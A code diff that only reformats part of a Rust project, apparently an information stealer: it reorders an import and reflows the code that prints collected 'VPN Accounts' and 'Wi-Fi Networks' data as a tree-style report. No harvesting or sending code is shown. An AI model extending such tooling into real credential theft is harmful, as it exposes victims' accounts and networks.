@@ -1,5 +1,5 @@
-use crate::{format, Collector};
 use crate::{Browser, Device, FileGrabber, Software, Vpn};
+use crate::{Collector, format};
 use alloc::borrow::Cow;
 use alloc::sync::Arc;
 use core::fmt::{Display, Formatter};
@@ -94,14 +94,14 @@ impl<T: Collector> CollectorDisplay for T {
                 ]
             ),
             collector_block!(
-                "🌐", "VPN" => [
-                    "🔐", "Accounts" => self.get_vpn().get_accounts(),
-                ]),
+            "🌐", "VPN" => [
+                "🔐", "Accounts" => self.get_vpn().get_accounts(),
+            ]),
             collector_block!(
                 "📶", "Device Data" => [
                     "📡", "Wi-Fi Networks" => self.get_device().get_wifi_networks(),
                 ]
-            )
+            ),
         ])
     }
 }
@@ -113,7 +113,11 @@ impl<T: Collector> Display for PrimitiveDisplayCollector<'_, T> {
         for block in self.0.display_blocks().iter() {
             writeln!(f, "▶ {}:", block.name)?;
             for (i, field) in block.fields.iter().enumerate() {
-                let prefix = if i + 1 == block.fields.len() { "└─" } else { "├─" };
+                let prefix = if i + 1 == block.fields.len() {
+                    "└─"
+                } else {
+                    "├─"
+                };
                 writeln!(f, "{} {}: {}", prefix, field.name, field.value)?;
             }
         }
